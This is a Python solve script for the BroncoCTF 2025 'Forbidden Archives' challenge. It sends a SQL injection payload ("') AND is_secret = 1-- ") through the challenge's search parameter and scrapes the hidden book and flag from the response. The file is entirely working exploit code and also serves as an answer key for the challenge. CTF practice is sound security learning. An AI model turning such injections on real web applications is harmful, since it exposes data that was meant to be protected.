#!/usr/bin/env python3
"""
Forbidden Archives — BroncoCTF 2025
SQL injection to retrieve the secret book with is_secret = 1
"""

import urllib.request
import urllib.parse
import re


def exploit():
    payload = urllib.parse.quote("') AND is_secret = 1-- ", safe='')
    url = f'https://broncoctf-forbidden-archives.chals.io/?search={payload}'

    resp = urllib.request.urlopen(url, timeout=10)
    html = resp.read().decode()

    title = re.search(r'<h3>(.*?)</h3>', html)
    if title:
        print(f"Book: {title.group(1)}")

    flag = re.search(r'<p>(bronco\{.*?\})</p>', html)
    if flag:
        print(f"Flag: {flag.group(1)}")

    return flag.group(1) if flag else None


if __name__ == '__main__':
    exploit()
